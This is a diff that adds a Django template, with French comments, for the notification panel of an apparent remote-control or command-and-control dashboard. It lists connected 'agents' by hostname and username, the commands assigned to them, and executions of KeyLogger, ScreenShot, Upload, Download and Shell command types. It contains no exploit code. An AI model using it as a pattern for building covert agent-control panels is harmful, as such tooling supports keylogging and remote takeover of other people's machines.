@@ -1,0 +1,78 @@
+{% load staticfiles %}
+<input type="text">-{{ nb }}-</input>
+{% if notif == 'newagents' %}
+<!-- On va créer des div pour l'afficher comme notifications-->
+  {% for ag in objets %}
+      <div style="margin-bottom:5px;" class="panel-body une_notification">
+        <table class="table">
+          <tr><td>Hostname:</td><td><span class="label label-info">{{ ag.hostname }}</span></td><td rowspan="3">
+            <div class="btn-group" data-toggle="buttons" style="right:1%;">
+            <label class="btn btn-default" onclick="agentvue($(this),{{ ag.id_client }});">
+                <input type="checkbox" autocomplete="off"> Vu
+            </label>
+            </div>
+            </td>
+          </tr>
+          <tr><td>Username:</td><td><span class="label label-info">{{ ag.USERNAME }}</span></td></tr>
+          <tr><td>System:</td><td><span class="label label-warning">{{ ag.syetem }}</span></td></tr>
+        </table>
+        <div style="text-align:right; cursor:pointer;" class="alert-info">{{ ag.dateajout }}</div>
+      </div>
+  {% endfor %}
+
+{% elif notif == 'newcommandes' %}
+  <!-- On va créer des div pour l'afficher comme notifications-->
+    {% for cmd in objets %}
+    <div style="margin-bottom:5px;" class="panel-body une_notification">
+      <table class="table">
+        <tr><td>La commande du titre <div class="label label-info">{{ cmd.commande.titre }}</div></td><td>
+          <div class="btn-group" data-toggle="buttons" style="right:1%;">
+          <label class="btn btn-default" onclick="newcmdvue($(this),{{ cmd.client.id_client }}, {{ cmd.commande.id_cmd }});">
+              <input type="checkbox" autocomplete="off"> Vue
+          </label>
+          </div>
+          </td>
+        </tr>
+        <tr><td colspan="2">Qui est affectée le <span class="label label-info">{{ cmd.date_affectation }}</span></td></tr>
+        <tr><td colspan="2">à l'agent <span class="label label-warning">{{ cmd.client.hostname }} | {{ cmd.client.USERNAME }}</span></td></tr>
+      </table>
+      <div style="text-align:right; cursor:pointer;" class="alert-info">Est éxecutée</div>
+    </div>
+    {% endfor %}
+
+{% elif notif == 'newexecutions' %}
+    <!-- On va créer des div pour l'afficher comme notifications-->
+      {% for execu in objets %}
+          <div style="margin-bottom:5px;" class="panel-body une_notification">
+            <table class="table" cellpadding="0" cellspacing="0">
+              <tr><td rowspan="2" colspan="2">
+                {% if execu.client_commande_ae.commande.type_cmd.nom == "KeyLogger" %}
+                  <img src="{% static 'serviceapp/imgs/keyboard.png' %}" alt="Keylogger" data-toggle="tooltip" data-placement="right" title="Commande Keylogger" class="img-circle logo_notification"/>
+                {% elif execu.client_commande_ae.commande.type_cmd.nom == "ScreenShot" %}
+                  <img src="{% static 'serviceapp/imgs/screenshot.png' %}" class="img-circle logo_notification" alt="ScreenShot" data-toggle="tooltip" data-placement="right" title="Commande ScreenShot"/>
+                {% elif execu.client_commande_ae.commande.type_cmd.nom == "Upload" %}
+                  <img src="{% static 'serviceapp/imgs/upload.png' %}" class="img-circle logo_notification" alt="Upload" data-toggle="tooltip" data-placement="right" title="Commande Upload"/>
+                {% elif execu.client_commande_ae.commande.type_cmd.nom == "Download" %}
+                  <img src="{% static 'serviceapp/imgs/download.png' %}" class="img-circle logo_notification" alt="download" data-toggle="tooltip" data-placement="right" title="Commande download"/>
+                {% elif execu.client_commande_ae.commande.type_cmd.nom == "Shell" %}
+                  <img src="{% static 'serviceapp/imgs/shell.png' %}" alt="Shell" title="Commande shell" data-toggle="tooltip" data-placement="right" class="img-circle logo_notification"/>
+                {% endif %}
+              </td>
+                <td colspan="2">
+                <div class="btn-group" data-toggle="buttons" style="right:1%;">
+                <label class="btn btn-default" onclick="newexecvue($(this),{{ execu.id_ae }},'{{ execu.client_commande_ae.commande.type_cmd.nom }}');">
+                    <input type="checkbox" autocomplete="off"> Vue
+                </label>
+                </div>
+                </td>
+              </tr>
+              <tr><td colspan="2"><span class="label label-info">{{ execu.client_commande_ae.commande.titre }}<span class="label label-info"></span></td></tr>
+              <tr><td>Agent:</td><td colspan="3"><span class="label label-warning">{{ execu.client_commande_ae.client.hostname }} | {{ execu.client_commande_ae.client.USERNAME }}</span></td></tr>
+            </table>
+            <div style="text-align:right; cursor:pointer;" class="alert-info">{{ execu.date_insertion_ae}}</div>
+          </div>
+      {% endfor %}
+      <script type="text/javascript">
+      $('[data-toggle="tooltip"]').tooltip();
+      </script>
+{% endif %}
